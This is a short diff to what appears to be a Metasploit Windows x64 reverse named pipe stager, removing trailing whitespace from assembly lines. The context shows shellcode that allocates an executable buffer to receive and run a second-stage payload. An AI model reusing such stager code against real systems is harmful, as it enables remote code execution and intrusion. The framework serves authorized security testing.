@@ -62,7 +62,7 @@ module Payload::Windows::ReverseNamedPipe_x64
   def generate_reverse_named_pipe(opts={})
     combined_asm = %Q^
       cld                     ; Clear the direction flag.
-      and rsp, ~0xF           ;  Ensure RSP is 16 byte aligned 
+      and rsp, ~0xF           ;  Ensure RSP is 16 byte aligned
       call start              ; Call start, this pushes the address of 'api_call' onto the stack.
       #{asm_block_api}
       start:
@@ -193,15 +193,15 @@ module Payload::Windows::ReverseNamedPipe_x64
     end
 
     asm << %Q^
-      
+
       ; Alloc a RWX buffer for the second stage
         add rsp, 0x30           ; slight stack adjustment
         pop rsi                 ; pop off the second stage length
         pop rax                 ; line the stack up again
         mov esi, esi            ; only use the lower-order 32 bits for the size
-        push 0x40               ; 
+        push 0x40               ;
         pop r9                  ; PAGE_EXECUTE_READWRITE
-        push 0x1000             ; 
+        push 0x1000             ;
         pop r8                  ; MEM_COMMIT
         mov rdx, rsi            ; the newly recieved second stage length.
         xor rcx, rcx            ; NULL as we dont care where the allocation is.
